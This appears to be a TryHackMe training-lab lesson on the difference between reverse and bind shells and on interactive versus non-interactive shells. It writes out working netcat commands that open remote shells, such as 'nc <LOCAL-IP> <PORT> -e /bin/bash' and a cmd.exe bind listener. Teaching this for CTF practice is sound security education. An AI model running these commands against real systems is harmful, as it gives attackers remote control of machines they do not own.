At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.

- **Reverse shells** are when the target is forced to execute code that connects _back_ to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a _listener_ which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
- **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

_Reverse Shell example:_  

Let's start with the more common reverse shell.

Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.  

Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.

On the attacking machine:

`sudo nc -lvnp 443`  

On the target:

`nc <LOCAL-IP> <PORT> -e /bin/bash`

Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are _listening_ on our own attacking machine, and sending a connection _from_ the target.  

_Bind Shell example:_

Bind shells are less common, but still very useful.

Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute `cmd.exe`. Then, with the listener up and running, we connect from our own machine to the newly opened port.

On the target:

`nc -lvnp <port> -e "cmd.exe"`  

On the attacking machine:

`nc MACHINE_IP <port>`

As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.

The important thing to understand here is that we are _listening_ on the target, then connecting to it with our own machine.

The final concept which is relevant in this task is that of interactivity. Shells can be either _interactive_ or _non-interactive_.

- _Interactive:_ If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to  
    interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:  
    ![](https://i.imgur.com/0ayLj8L.png)  
    Here you can see that it's asking _interactively_ that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.  
      
      
    
- _Non-Interactive_ shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:  
    ![](https://i.imgur.com/rXyEDKU.png)  
    Notice that the `whoami` command (which is non-interactive) executes perfectly, but the `ssh` command (which _is_ interactive) gives us no output at all. As an interesting side note, the output of an interactive command _does_ go somewhere, however, figuring out **where** is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task you will see a command in the screenshots called `listener`. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing `sudo rlwrap nc -lvnp 443`, which will be covered in upcoming tasks. It will _not_ work on any other machine unless the alias has been configured locally.
